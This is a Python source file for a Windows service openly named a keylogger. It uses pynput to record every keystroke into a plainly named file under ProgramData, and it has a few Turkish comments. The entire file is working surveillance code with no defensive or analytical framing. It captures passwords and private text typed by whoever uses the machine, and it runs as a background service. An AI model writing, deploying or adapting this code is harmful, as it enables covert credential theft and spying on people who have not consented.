import os
import win32serviceutil
import win32service
import win32event
import datetime
import time
import pynput

class KeyloggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "KeyloggerService"
    _svc_display_name_ = "Keylogger Service"
    _svc_description_ = "A service that logs keystrokes."

    FILE_PATH = "C:\\ProgramData\\MyService\\properties.txt"
    ERROR_LOG_PATH = "C:\\ProgramData\\MyService\\error_log.txt"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        self.listener = None
        self.ensure_directory_exists()

    def ensure_directory_exists(self):
        directory = os.path.dirname(self.FILE_PATH)
        if not os.path.exists(directory):
            os.makedirs(directory)

    def log_error(self, message):
        try:
            with open(self.ERROR_LOG_PATH, "a") as f:
                f.write(f"{datetime.datetime.now()}: {message}\n")
        except Exception as e:
            # Hata günlüğü dosyasına yazılamıyorsa, konsola yazdırın
            print(f"Failed to log error: {e}")

    def test_log_error(self):
        try:
            self.log_error("Test error message.")
            print("Error log test successful.")
        except Exception as e:
            print(f"Error logging test failed: {e}")

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.running = False
        if self.listener:
            self.listener.stop()
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        self.main()

    def write_datetime_to_file(self):
        try:
            with open(self.FILE_PATH, "a") as f:
                current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write("\n")
                f.write(current_datetime)
                f.write("\n")
        except Exception as e:
            self.log_error(f"Failed to write datetime to file: {e}")

    def on_press(self, key):
        try:
            with open(self.FILE_PATH, "a") as f:
                if hasattr(key, 'char') and key.char is not None:
                    f.write(f"{key.char}")
                else:
                    if key == pynput.keyboard.Key.space:
                        f.write(" ")
                    else:
                        f.write(f" [{key}] ")
        except Exception as e:
            self.log_error(f"Failed to write key press to file: {e}")

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc:
            return False

    def main(self):
        try:
            self.write_datetime_to_file()
            self.test_log_error()  # Hata günlüğü testini ekleyin

            with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
                while self.running:
                    time.sleep(0.1)
        except Exception as e:
            self.log_error(f"Error in main: {e}")

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(KeyloggerService)
